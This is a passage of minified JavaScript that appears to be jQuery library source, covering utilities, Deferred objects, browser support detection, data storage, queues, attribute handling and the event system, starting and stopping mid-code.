c=0,d=b.length;c<d;c++)if(b[c]===a)return c;return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=D.call(arguments,2),g=function(){return a.apply(c,f.concat(D.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=s.exec(a)||t.exec(a)||u.exec(a)||a.indexOf("compatible")<0&&v.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){G["[object "+b+"]"]=b.toLowerCase()}),x=e.uaMatch(w),x.browser&&(e.browser[x.browser]=!0,e.browser.version=x.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?z=function(){c.removeEventListener("DOMContentLoaded",z,!1),e.ready()}:c.attachEvent&&(z=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",z),e.ready())});return e}(),g="done fail isResolved isRejected promise then always pipe".split(" "),h=[].slice;f.extend({_Deferred:function(){var a=[],b,c,d,e={done:function(){if(!d){var c=arguments,g,h,i,j,k;b&&(k=b,b=0);for(g=0,h=c.length;g<h;g++)i=c[g],j=f.type(i),j==="array"?e.done.apply(e,i):j==="function"&&a.push(i);k&&e.resolveWith(k[0],k[1])}return this},resolveWith:function(e,f){if(!d&&!b&&!c){f=f||[],c=1;try{while(a[0])a.shift().apply(e,f)}finally{b=[e,f],c=0}}return this},resolve:function(){e.resolveWith(this,arguments);return this},isResolved:function(){return!!c||!!b},cancel:function(){d=1,a=[];return this}};return e},Deferred:function(a){var b=f._Deferred(),c=f._Deferred(),d;f.extend(b,{then:function(a,c){b.done(a).fail(c);return this},always:function(){return b.done.apply(b,arguments).fail.apply(this,arguments)},fail:c.done,rejectWith:c.resolveWith,reject:c.resolve,isRejected:c.isResolved,pipe:function(a,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[c,"reject"]},function(a,c){var e=c[0],g=c[1],h;f.isFunction(e)?b[a](function(){h=e.apply(this,arguments),h&&f.isFunction(h.promise)?h.promise().then(d.resolve,d.reject):d[g](h)}):b[a](d[g])})}).promise()},promise:function(a){if(a==null){if(d)return d;d=a={}}var c=g.length;while(c--)a[g[c]]=b[g[c]];return a}}),b.done(c.cancel).fail(b.cancel),delete b.cancel,a&&a.call(b,b);return b},when:function(a){function i(a){return function(c){b[a]=arguments.length>1?h.call(arguments,0):c,--e||g.resolveWith(g,h.call(b,0))}}var b=arguments,c=0,d=b.length,e=d,g=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred();if(d>1){for(;c<d;c++)b[c]&&f.isFunction(b[c].promise)?b[c].promise().then(i(c),g.reject):--e;e||g.resolveWith(g,b)}else g!==a&&g.resolveWith(g,d?[a]:[]);return g.promise()}}),f.support=function(){var a=c.createElement("div"),b=c.documentElement,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r;a.setAttribute("className","t"),a.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=a.getElementsByTagName("*"),e=a.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};f=c.createElement("select"),g=f.appendChild(c.createElement("option")),h=a.getElementsByTagName("input")[0],j={leadingWhitespace:a.firstChild.nodeType===3,tbody:!a.getElementsByTagName("tbody").length,htmlSerialize:!!a.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55$/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:h.value==="on",optSelected:g.selected,getSetAttribute:a.className!=="t",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},h.checked=!0,j.noCloneChecked=h.cloneNode(!0).checked,f.disabled=!0,j.optDisabled=!g.disabled;try{delete a.test}catch(s){j.deleteExpando=!1}!a.addEventListener&&a.attachEvent&&a.fireEvent&&(a.attachEvent("onclick",function b(){j.noCloneEvent=!1,a.detachEvent("onclick",b)}),a.cloneNode(!0).fireEvent("onclick")),h=c.createElement("input"),h.value="t",h.setAttribute("type","radio"),j.radioValue=h.value==="t",h.setAttribute("checked","checked"),a.appendChild(h),k=c.createDocumentFragment(),k.appendChild(a.firstChild),j.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,a.innerHTML="",a.style.width=a.style.paddingLeft="1px",l=c.createElement("body"),m={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"};for(q in m)l.style[q]=m[q];l.appendChild(a),b.insertBefore(l,b.firstChild),j.appendChecked=h.checked,j.boxModel=a.offsetWidth===2,"zoom"in a.style&&(a.style.display="inline",a.style.zoom=1,j.inlineBlockNeedsLayout=a.offsetWidth===2,a.style.display="",a.innerHTML="<div style='width:4px;'></div>",j.shrinkWrapBlocks=a.offsetWidth!==2),a.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",n=a.getElementsByTagName("td"),r=n[0].offsetHeight===0,n[0].style.display="",n[1].style.display="none",j.reliableHiddenOffsets=r&&n[0].offsetHeight===0,a.innerHTML="",c.defaultView&&c.defaultView.getComputedStyle&&(i=c.createElement("div"),i.style.width="0",i.style.marginRight="0",a.appendChild(i),j.reliableMarginRight=(parseInt((c.defaultView.getComputedStyle(i,null)||{marginRight:0}).marginRight,10)||0)===0),l.innerHTML="",b.removeChild(l);if(a.attachEvent)for(q in{submit:1,change:1,focusin:1})p="on"+q,r=p in a,r||(a.setAttribute(p,"return;"),r=typeof a[p]=="function"),j[q+"Bubbles"]=r;return j}(),f.boxModel=f.support.boxModel;var i=/^(?:\{.*\}|\[.*\])$/,j=/([a-z])([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!l(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g=f.expando,h=typeof c=="string",i,j=a.nodeType,k=j?f.cache:a,l=j?a[f.expando]:a[f.expando]&&f.expando;if((!l||e&&l&&!k[l][g])&&h&&d===b)return;l||(j?a[f.expando]=l=++f.uuid:l=f.expando),k[l]||(k[l]={},j||(k[l].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?k[l][g]=f.extend(k[l][g],c):k[l]=f.extend(k[l],c);i=k[l],e&&(i[g]||(i[g]={}),i=i[g]),d!==b&&(i[f.camelCase(c)]=d);if(c==="events"&&!i[c])return i[g]&&i[g].events;return h?i[f.camelCase(c)]:i}},removeData:function(b,c,d){if(!!f.acceptData(b)){var e=f.expando,g=b.nodeType,h=g?f.cache:b,i=g?b[f.expando]:f.expando;if(!h[i])return;if(c){var j=d?h[i][e]:h[i];if(j){delete j[c];if(!l(j))return}}if(d){delete h[i][e];if(!l(h[i]))return}var k=h[i][e];f.support.deleteExpando||h!=a?delete h[i]:h[i]=null,k?(h[i]={},g||(h[i].toJSON=f.noop),h[i][e]=k):g&&(f.support.deleteExpando?delete b[f.expando]:b.removeAttribute?b.removeAttribute(f.expando):b[f.expando]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d=null;if(typeof a=="undefined"){if(this.length){d=f.data(this[0]);if(this[0].nodeType===1){var e=this[0].attributes,g;for(var h=0,i=e.length;h<i;h++)g=e[h].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),k(this[0],g,d[g]))}}return d}if(typeof a=="object")return this.each(function(){f.data(this,a)});var j=a.split(".");j[1]=j[1]?"."+j[1]:"";if(c===b){d=this.triggerHandler("getData"+j[1]+"!",[j[0]]),d===b&&this.length&&(d=f.data(this[0],a),d=k(this[0],a,d));return d===b&&j[1]?this.data(j[0]):d}return this.each(function(){var b=f(this),d=[j[0],c];b.triggerHandler("setData"+j[1]+"!",d),f.data(this,a,c),b.triggerHandler("changeData"+j[1]+"!",d)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,c){a&&(c=(c||"fx")+"mark",f.data(a,c,(f.data(a,c,b,!0)||0)+1,!0))},_unmark:function(a,c,d){a!==!0&&(d=c,c=a,a=!1);if(c){d=d||"fx";var e=d+"mark",g=a?0:(f.data(c,e,b,!0)||1)-1;g?f.data(c,e,g,!0):(f.removeData(c,e,!0),m(c,d,"mark"))}},queue:function(a,c,d){if(a){c=(c||"fx")+"queue";var e=f.data(a,c,b,!0);d&&(!e||f.isArray(d)?e=f.data(a,c,f.makeArray(d),!0):e.push(d));return e||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e;d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),d.call(a,function(){f.dequeue(a,b)})),c.length||(f.removeData(a,b+"queue",!0),m(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(){var c=this;setTimeout(function(){f.dequeue(c,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f._Deferred(),!0))h++,l.done(m);m();return d.promise()}});var n=/[\n\t\r]/g,o=/\s+/,p=/\r/g,q=/^(?:button|input)$/i,r=/^(?:button|input|object|select|textarea)$/i,s=/^a(?:rea)?$/i,t=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,u=/\:/,v,w;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.addClass(a.call(this,b,c.attr("class")||""))});if(a&&typeof a=="string"){var b=(a||"").split(o);for(var c=0,d=this.length;c<d;c++){var e=this[c];if(e.nodeType===1)if(!e.className)e.className=a;else{var g=" "+e.className+" ",h=e.className;for(var i=0,j=b.length;i<j;i++)g.indexOf(" "+b[i]+" ")<0&&(h+=" "+b[i]);e.className=f.trim(h)}}}return this},removeClass:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.removeClass(a.call(this,b,c.attr("class")))});if(a&&typeof a=="string"||a===b){var c=(a||"").split(o);for(var d=0,e=this.length;d<e;d++){var g=this[d];if(g.nodeType===1&&g.className)if(a){var h=(" "+g.className+" ").replace(n," ");for(var i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){var d=f(this);d.toggleClass(a.call(this,c,d.attr("class"),b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(o);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ";for(var c=0,d=this.length;c<d;c++)if((" "+this[c].className+" ").replace(n," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e=this[0];if(!arguments.length){if(e){c=f.valHooks[e.nodeName.toLowerCase()]||f.valHooks[e.type];if(c&&"get"in c&&(d=c.get(e,"value"))!==b)return d;return(e.value||"").replace(p,"")}return b}var g=f.isFunction(a);return this.each(function(d){var e=f(this),h;if(this.nodeType===1){g?h=a.call(this,d,e.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c=a.selectedIndex,d=[],e=a.options,g=a.type==="select-one";if(c<0)return null;for(var h=g?c:0,i=g?c+1:e.length;h<i;h++){var j=e[h];if(j.selected&&(f.support.optDisabled?!j.disabled:j.getAttribute("disabled")===null)&&(!j.parentNode.disabled||!f.nodeName(j.parentNode,"optgroup"))){b=f(j).val();if(g)return b;d.push(b)}}if(g&&!d.length&&e.length)return f(e[c]).val();return d},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attrFix:{tabindex:"tabIndex"},attr:function(a,c,d,e){var g=a.nodeType;if(!a||g===3||g===8||g===2)return b;if(e&&c in f.attrFn)return f(a)[c](d);if(!("getAttribute"in a))return f.prop(a,c,d);var h,i,j=g!==1||!f.isXMLDoc(a);c=j&&f.attrFix[c]||c,i=f.attrHooks[c],i||(!t.test(c)||typeof d!="boolean"&&d!==b&&d.toLowerCase()!==c.toLowerCase()?v&&(f.nodeName(a,"form")||u.test(c))&&(i=v):i=w);if(d!==b){if(d===null){f.removeAttr(a,c);return b}if(i&&"set"in i&&j&&(h=i.set(a,d,c))!==b)return h;a.setAttribute(c,""+d);return d}if(i&&"get"in i&&j)return i.get(a,c);h=a.getAttribute(c);return h===null?b:h},removeAttr:function(a,b){var c;a.nodeType===1&&(b=f.attrFix[b]||b,f.support.getSetAttribute?a.removeAttribute(b):(f.attr(a,b,""),a.removeAttributeNode(a.getAttributeNode(b))),t.test(b)&&(c=f.propFix[b]||b)in a&&(a[c]=!1))},attrHooks:{type:{set:function(a,b){if(q.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},tabIndex:{get:function(a){var c=a.getAttributeNode("tabIndex");return c&&c.specified?parseInt(c.value,10):r.test(a.nodeName)||s.test(a.nodeName)&&a.href?0:b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e=a.nodeType;if(!a||e===3||e===8||e===2)return b;var g,h,i=e!==1||!f.isXMLDoc(a);c=i&&f.propFix[c]||c,h=f.propHooks[c];return d!==b?h&&"set"in h&&(g=h.set(a,d,c))!==b?g:a[c]=d:h&&"get"in h&&(g=h.get(a,c))!==b?g:a[c]},propHooks:{}}),w={get:function(a,c){return a[f.propFix[c]||c]?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=b),a.setAttribute(c,c.toLowerCase()));return c}},f.attrHooks.value={get:function(a,b){if(v&&f.nodeName(a,"button"))return v.get(a,b);return a.value},set:function(a,b,c){if(v&&f.nodeName(a,"button"))return v.set(a,b,c);a.value=b}},f.support.getSetAttribute||(f.attrFix=f.propFix,v=f.attrHooks.name=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&d.nodeValue!==""?d.nodeValue:b},set:function(a,b,c){var d=a.getAttributeNode(c);if(d){d.nodeValue=b;return b}}},f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})})),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex)}})),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var x=Object.prototype.hasOwnProperty,y=/\.(.*)$/,z=/^(?:textarea|input|select)$/i,A=/\./g,B=/ /g,C=/[^\w\s.|`]/g,D=function(a){return a.replace(C,"\\$&")};f.event={add:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){if(d===!1)d=E;else if(!d)return;var g,h;d.handler&&(g=d,d=g.handler),d.guid||(d.guid=f.guid++);var i=f._data(a);if(!i)return;var j=i.events,k=i.handle;j||(i.events=j={}),k||(i.handle=k=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.handle.apply(k.elem,arguments):b}),k.elem=a,c=c.split(" ");var l,m=0,n;while(l=c[m++]){h=g?f.extend({},g):{handler:d,data:e},l.indexOf(".")>-1?(n=l.split("."),l=n.shift(),h.namespace=n.slice(0).sort().join(".")):(n=[],h.namespace=""),h.type=l,h.guid||(h.guid=d.guid);var o=j[l],p=f.event.special[l]||{};if(!o){o=j[l]=[];if(!p.setup||p.setup.call(a,e,n,k)===!1)a.addEventListener?a.addEventListener(l,k,!1):a.attachEvent&&a.attachEvent("on"+l,k)}p.add&&(p.add.call(a,h),h.handler.guid||(h.handler.guid=d.guid)),o.push(h),f.event.global[l]=!0}a=null}},global:{},remove:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){d===!1&&(d=E);var g,h,i,j,k=0,l,m,n,o,p,q,r,s=f.hasData(a)&&f._data(a),t=s&&s.events;if(!s||!t)return;c&&c.type&&(d=c.handler,c=c.type);if(!c||typeof c=="string"&&c.charAt(0)==="."){c=c||"";for(h in t)f.event.remove(a,h+c);return}c=c.split(" ");while(h=c[k++]){r=h,q=null,l=h.indexOf(".")<0,m=[],l||(m=h.split("."),h=m.shift(),n=new RegExp("(^|\\.)"+f.map(m.slice(0).sort(),D).join("\\.(?:.*\\.)?")+"(\\.|$)")),p=t[h];if(!p)continue;if(!d){for(j=0;j<p.length;j++){q=p[j];if(l||n.test(q.namespace))f.event.remove(a,r,q.handler,j),p.splice(j--,1)}continue}o=f.event.special[h]||{};for(j=e||0;j<p.length;j++){q=p[j];if(d.guid===q.guid){if(l||n.test(q.namespace))e==null&&p.splice(j--,1),o.remove&&o.remove.call(a,q);if(e!=null)break}}if(p.length===0||e!=null&&p.length===1)(!o.teardown||o.teardown.call(a,m)===!1)&&f.removeEvent(a,h,s.handle),g=null,delete t[h]}if(f.isEmptyObject(t)){var u=s.handle;u&&(u.elem=null),delete s.events,delete s.handle,f.isEmptyObject(s)&&f.removeData(a,b,!0)}}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){var h=c.type||c,i=[],j;h.indexOf("!")>=0&&(h=h.slice(0,-1),j=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if(!!e&&!f.event.customEvent[h]||!!f.event.global[h]){c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.exclusive=j,c.namespace=i.join("."),c.namespace_re=new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)");if(g||!e)c.preventDefault(),c.stopPropagation();if(!e){f.each(f.cache,function(){var a=f.expando,b=this[a];b&&b.events&&b.events[h]&&f.event.trigger(c,d,b.handle.elem
)});return}if(e.nodeType===3||e.nodeType===8)return;c.result=b,c.target=e,d=d?f.makeArray(d):[],d.unshift(c);var k=e,l=h.indexOf(":")<0?"on"+h:"";do{var m=f._data(k,"handle");c.currentTarget=k,m&&m.apply(k,d),l&&f.acceptData(k)&&k[l]&&k[l].apply(k,d)===!1&&(c.result=!1,c.preventDefault()),k=k.parentNode||k.ownerDocument||k===c.target.ownerDocument&&a}while(k&&!c.isPropagationStopped());if(!c.isDefaultPrevented()){var n,o=f.event.special[h]||{};if((!o._default||o._default.call(e.ownerDocument,c)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)){try{l&&e[h]&&(n=e[l],n&&(e[l]=null),f.event.triggered=h,e[h]())}catch(p){}n&&(e[l]=n),f.event.triggered=b}}return c.result}},handle:function(c){c=f.event.fix(c||a.event);var d=((f._data(this,"events")||{})[c.type]||[]).slice(0),e=!c.exclusive&&!c.namespace,g=Array.prototype.slice.call(arguments,0);g[0]=c,c.currentTarget=this;for(var h=0,i=d.length;h<i;h++){var j=d[h];if(e||c.namespace_re.test(j.namespace)){c.handler=j.handler,c.data=j.data,c.handleObj=j;var k=j.handler.apply(this,g);k!==b&&(c.result=k,k===!1&&(c.preventDefault(),c.stopPropagation()));if(c.isImmediatePropagationStopped())break}}return c.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[f.expando])return a;var d=a;a=f.Event(d);for(var e=this.props.length,g;e;)g=this.props[--e],a[g]=d[g];a.target||(a.target=a.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),!a.relatedTarget&&a.fromElement&&(a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement);if(a.pageX==null&&a.clientX!=null){var h=a.target.ownerDocument||c,i=h.documentElement,j=h.body;a.pageX=a.clientX+(i&&i.scrollLeft||j&&j.scrollLeft||0)-(i&&i.clientLeft||j&&j.clientLeft||0),a.pageY=a.clientY+(i&&i.scrollTop||j&&j.scrollTop||0)-(i&&i.clientTop||j&&j.clientTop||0)}a.which==null&&(a.charCode!=null||a.keyCode!=null)&&(a.which=a.charCode!=null?a.charCode:a.keyCode),!a.metaKey&&a.ctrlKey&&(a.metaKey=a.ctrlKey),!a.which&&a.button!==b&&(a.which=a.button&1?1:a.button&2?3:a.button&4?2:0);return a},guid:1e8,proxy:f.proxy,special:{ready:{setup:f.bindReady,teardown:f.noop},live:{add:function(a){f.event.add(this,O(a.origType,a.selector),f.extend({},a,{handler:N,guid:a.handler.guid}))},remove:function(a){f.event.remove(this,O(a.origType,a.selector),a)}},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}}},f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!this.preventDefault)return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?F:E):this.type=a,b&&f.extend(this,b),this.timeStamp=f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=F;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=F;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=F,this.stopPropagation()},isDefaultPrevented:E,isPropagationStopped:E,isImmediatePropagationStopped:E};var G=function(a){var b=a.relatedTarget;a.type=a.data;try{if(b&&b!==c&&!b.parentNode)return;while(b&&b!==this)b=b.parentNode;b!==this&&f.event.handle.apply(this,arguments)}catch(d){}},H=function(a){a.type=a.data,f.event.handle.apply(this,arguments)};f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={setup:function(c){f.event.add(this,b,c&&c.selector?H:G,a)},teardown:function(a){f.event.remove(this,b,a&&a.selector?H:G)}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(a,b){if(!f.nodeName(this,"form"))f.event.add(this,"click.specialSubmit",function(a){var b=a.target,c=b.type;(c==="submit"||c==="image")&&f(b).closest("form").length&&L("submit",this,arguments)}),f.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,c=b.type;(c==="text"||c==="password")&&f(b).closest("form").length&&a.keyCode===13&&L("submit",this,arguments)});else return!1},teardown:function(a){f.event.remove(this,".specialSubmit")}});if(!f.support.changeBubbles){var I,J=function(a){var b=a.type,c=a.value;b==="radio"||b==="checkbox"?c=a.checked:b==="select-multiple"?c=a.selectedIndex>-1?f.map(a.options,function(a){return a.selected}).join("-"):"":f.nodeName(a,"select")&&(c=a.selectedIndex);return c},K=function(c){var d=c.target,e,g;if(!!z.test(d.nodeName)&&!d.readOnly){e=f._data(d,"_change_data"),g=J(d),(c.type!=="focusout"||d.type!=="radio")&&f._data(d,"_change_data",g);if(e===b||g===e)return;if(e!=null||g)c.type="change",c.liveFired=b,f.event.trigger(c,arguments[1],d)}};f.event.special.change={filters:{focusout:K,beforedeactivate:K,click:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(c==="radio"||c==="checkbox"||f.nodeName(b,"select"))&&K.call(this,a)},keydown:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(a.keyCode===13&&!f.nodeName(b,"textarea")||a.keyCode===32&&(c==="checkbox"||c==="radio")||c==="select-multiple")&&K.call(this,a)},beforeactivate:function(a){var b=a.target;f._data(b,"_change_data",J(b))}},setup:function(a,b){if(this.type==="file")return!1;for(var c in I)f.event.add(this,c+".specialChange",I[c]);return z.test(this.nodeName)},teardown:function(a){f.event.remove(this,".specialChange");return z.test(this.nodeName)}},I=f.event.special.change.filters,I.focus=I.beforeactivate}f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){function e(a){var c=f.event.fix(a);c.type=b,c.originalEvent={},f.event.trigger(c,null,c.target),c.isDefaultPrevented()&&a.preventDefault()}var d=0;f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.each(["bind","one"],function(a,c){f.fn[c]=function(a,d,e){var g;if(typeof a=="object"){for(var h in a)this[c](h,d,a[h],e);return this}if(arguments.length===2||d===!1)e=d,d=b;c==="one"?(g=function(a){f(this).unbind(a,g);return e.apply(this,arguments)},g.guid=e.guid||f.guid++):g=e;if(a==="unload"&&c!=="one")this.one(a,d,e);else for(var i=0,j=this.length;i<j;i++)f.event.add(this[i],a,g,d);return this}}),f.fn.extend({unbind:function(a,b){if(typeof a=="object"&&!a.preventDefault)for(var c in a)this.unbind(c,a[c]);else for(var d=0,e=this.length;d<e;d++)f.event.remove(this[d],a,b);return this},delegate:function(a,b,c,d){return this.live(b,c,d,a)},undelegate:function(a,b,c){return arguments.length===0?this.unbind("live"):this.die(b,null,c,a)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f.data(this,"lastToggle"+a.guid)||0)%d;f.data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return 